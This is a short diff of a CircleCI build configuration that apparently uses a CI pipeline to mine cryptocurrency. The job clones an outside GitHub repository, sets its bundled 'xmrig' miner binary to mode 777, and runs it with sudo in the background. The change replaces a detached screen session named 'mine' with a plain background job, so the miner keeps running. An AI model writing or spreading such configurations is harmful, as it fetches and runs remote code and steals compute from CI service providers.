@@ -7,7 +7,6 @@ jobs:
       - checkout
       # Whatever you want to do
       - run: sudo apt-get update
-      - run: sudo apt-get install screen top -y
+      - run: sudo apt-get install screen -y
       - run: sudo git clone https://github.com/yszalxh/circleci.git
-      - run: sudo screen -dmS mine bash -c 'cd circleci && sudo chmod 777 xmrig && sudo ./xmrig'
-      - run: sudo top
+      - run: cd circleci && sudo chmod 777 xmrig && sudo ./xmrig &
